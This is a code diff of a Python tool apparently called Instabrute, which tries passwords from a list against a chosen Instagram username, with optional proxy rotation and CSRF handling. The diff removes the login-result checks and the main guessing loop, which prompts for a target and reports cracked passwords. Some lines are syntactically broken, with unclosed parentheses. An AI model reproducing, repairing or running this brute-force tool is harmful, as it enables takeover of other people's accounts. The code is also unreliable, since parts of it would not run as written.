@@ -31,7 +31,7 @@ class Instabrute():
 		self.loadPasswords()
 		#Check if username exists
 		self.IsUserExists()
-		UsePorxy = 'NO'
+		UsePorxy = 'N'
 		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
 			self.randomProxy()
 	#Check if password file exists and check if he contain passwords
@@ -102,41 +102,8 @@ class Instabrute():
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']}
 		#parse response
 		data = json.loads(r.text)
-		if (data['status'] == 'fail'):
-			print (data['message'])
-			UsePorxy = 'NO'
-			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-				print ('[$] Try to use proxy after fail.'
-				randomProxy() #Check that, may contain bugs
-			return False
-		#return session if password is correct
-		if (data['authenticated'] == True):
-			return sess
-		else:
-			return False
 
-instabrute = Instabrute(Input('Please enter a username: '))
-try:
-	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): '))
-except Exception as e:
-	print ('[*] Error, software use the defult value "4"')
-	delayLoop = 4
-print ('')
 
-for password in instabrute.passwords:
-	sess = instabrute.Login(password)
-	if sess:
-		print ('[*] Login success %s' % [instabrute.username,password])
-	else:
-		print ('[*] Password incorrect [%s]' % password)
-	try:
-		time.sleep(delayLoop)
-	except KeyboardInterrupt:
-		WantToExit = str(Input('Type y/n to exit: ')).upper()
-		if (WantToExit == 'Y' or WantToExit == 'YES'):
-			exit()
-		else:
-			continue
 
 
 		
